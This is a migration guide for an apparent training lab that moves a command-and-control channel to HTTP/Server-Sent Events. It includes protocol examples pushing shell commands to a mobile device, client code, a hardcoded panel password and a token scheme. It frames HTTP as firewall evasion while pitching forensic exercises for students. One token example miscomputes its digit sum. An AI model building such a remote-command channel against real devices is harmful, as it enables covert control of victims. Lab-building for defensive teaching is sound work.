# Migration Guide: C2 TCP/WebSocket → HTTP/SSE

## Summary of Changes

| Aspect | Before (TCP/WS) | After (HTTP/SSE) |
|---------|---------------|-------------------|
| C2 port | 8443 (TCP), 8444 (WS) | 4999 (HTTP) |
| Protocol | Native TCP + WebSocket | HTTP + Server-Sent Events |
| Container | Embedded in vulnzoo-vulnerable | Separate (c2-server) |
| FW evasion | Low (non-standard ports) | High (standard HTTP) |
| NAT traversal | Problems with 4G/5G | Works on any network |

## New Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                   HOST / EXTERNAL NETWORK                   │
│  ┌─────────────────┐              ┌─────────────────────┐  │
│  │ Mobile Device   │◄────────────►│ C2 Server           │  │
│  │ (HTTP/SSE)      │   Port 4999  │ (c2-server)         │  │
│  └─────────────────┘              └──────────┬──────────┘  │
│                                              │              │
└──────────────────────────────────────────────┼──────────────┘
                                               │
                              ┌────────────────┼────────────────┐
                              │     DOCKER NETWORK (c2_net)     │
                              │                                 │
                              │  ┌──────────┐   ┌──────────┐   │
                              │  │ MongoDB  │◄──┤ API Flask│   │
                              │  │          │   │ (5000)   │   │
                              │  └──────────┘   └──────────┘   │
                              │                                 │
                              └─────────────────────────────────┘
```

## Docker Compose Changes

### New Service: c2-server

```yaml
c2-server:
  build:
    context: ./c2_server
  ports:
    - "4999:4999"
  networks:
    - bridge      # External access
    - c2_net      # Internal communication
  # NO access to cam_net (isolation)
```

### Modified Service: vulnzoo-vulnerable

```yaml
vulnzoo-vulnerable:
  ports:
    - "5000:5000"
    # Removed: 8443:8443, 8444:8444
  networks:
    - c2_net      # New: access to C2
```

## C2 Communication Flow

### 1. Token Validation

**Request:**
```http
POST /api/v2/diag/validate HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{
  "token": "000007",
  "device_id": "android-123",
  "model": "Pixel 7"
}
```

**Response:**
```json
{
  "status": "authorized",
  "c2_endpoint": "http://c2-server:4999/stream",
  "c2_response_endpoint": "http://c2-server:4999/response",
  "headers": {
    "X-Device-ID": "android-123",
    "X-Diag-Token": "000007",
    "X-Device-Model": "Pixel 7"
  }
}
```

### 2. SSE Connection (Downstream Channel)

**Request:**
```http
GET /stream HTTP/1.1
Host: c2-server:4999
X-Device-ID: android-123
X-Diag-Token: 000007
X-Device-Model: Pixel 7
Accept: text/event-stream
Cache-Control: no-cache
```

**Response (Server-Sent Events):**
```
event: connected
data: {"session_id": "c2_android-123_000007_1234567890"}

event: cmd
data: {"type": "shell_cmd", "data": "id"}

event: heartbeat
data: {"type": "heartbeat", "timestamp": 1234567890}
```

### 3. Response Submission (Upstream Channel)

**Request:**
```http
POST /response HTTP/1.1
Host: c2-server:4999
Content-Type: application/json
X-Device-ID: android-123
X-Diag-Token: 000007

{
  "session_id": "c2_android-123_000007_1234567890",
  "type": "output",
  "data": "uid=1000(u0_a123) gid=1000(u0_a123)",
  "timestamp": 1234567890000
}
```

## Code Changes

### API Flask (app.py)

**Before:**
```python
from core.c2_diag import c2_server
# ...
if vuln==1:
    c2_server.start()  # Started TCP+WS
```

**After:**
```python
from core.c2_diag import c2_server
import requests
# ...
# C2 is now external, not started here
# Only decoy endpoints are redirected
```

### Mobile App (DiagSysService.kt)

**Before:**
```kotlin
// Native TCP connection
socket = Socket()
socket.connect(InetSocketAddress(host, 8443), 15000)
sendLengthPrefixed(output, handshake)
```

**After:**
```kotlin
// HTTP/SSE connection
val url = URL(ApiConfig.C2_SSE_ENDPOINT)
val conn = url.openConnection() as HttpURLConnection
conn.setRequestProperty(ApiConfig.HEADER_DEVICE_ID, deviceId)
conn.setRequestProperty(ApiConfig.HEADER_DIAG_TOKEN, token)
// Process SSE events...
```

## C2 Control Panel

**URL:** `http://localhost:4999/panel`

**Credentials:**
- Password: `letstechin`

**Features:**
- List of active sessions (HTTP polling every 2s)
- Interactive terminal (commands via POST)
- Audit logs
- Support for multiple simultaneous sessions

## Device Simulator

```bash
# Start simulator
cd cloud_api/c2_server
python device_simulator.py --token 000007

# Multiple devices
python device_simulator.py --multi 10

# With detailed logs
python device_simulator.py -v --token 000007
```

## Pedagogical Benefits

### 1. Realistic Forensic Analysis

Students must:
- Identify "suspicious" HTTP traffic among normal traffic
- Detect beaconing patterns (heartbeats every 30s)
- Correlate persistent SSE connections with malicious activity
- Find indicative strings in headers (X-Diag-Token)

### 2. Firewall Evasion

**Before:**
```
Ports 8443/8444 visible to any firewall
```

**After:**
```
Standard HTTP traffic to port 4999
Custom headers allow identification:
- X-Device-ID
- X-Diag-Token
- X-Device-Model
```

### 3. Independent Containment

```bash
# Block C2 without affecting the legitimate API
docker-compose stop c2-server

# API keeps working
curl http://localhost:5000/api/health
# {"status": "healthy"}
```

## Valid Tokens

Algorithm: `sum(hex_digits) % 7 == 0`

**Generator:**
```python
def generate_valid_token():
    import random
    while True:
        token = ''.join(random.choices('0123456789ABCDEF', k=6))
        total = sum(int(c, 16) for c in token)
        if total % 7 == 0:
            return token
```

**Examples:**
- `000000` (sum=0)
- `000007` (sum=7)
- `000016` (sum=7)
- `00A005` (sum=5+5=10, 10%7=3 → invalid)

## Troubleshooting

### C2 not responding
```bash
# Check container
docker-compose ps c2-server

# Logs
docker-compose logs -f c2-server

# Health check
curl http://localhost:4999/health
```

### Device not connecting
```bash
# Check Docker network
docker network ls
docker network inspect cloud_api_c2_net

# Test from API container
docker exec -it vulnzoo-vulnerable curl http://c2-server:4999/health
```

### SSE Issues
```bash
# Manual SSE test
curl -N http://localhost:4999/stream \
  -H "X-Device-ID: test" \
  -H "X-Diag-Token: 000007" \
  -H "X-Device-Model: Test"
```

## References

- [Server-Sent Events (MDN)](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events)
- [HTTP Tunneling Techniques](https://en.wikipedia.org/wiki/HTTP_tunnel)
- [APT Infrastructure Patterns](https://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/cyber-adversary-behavior)
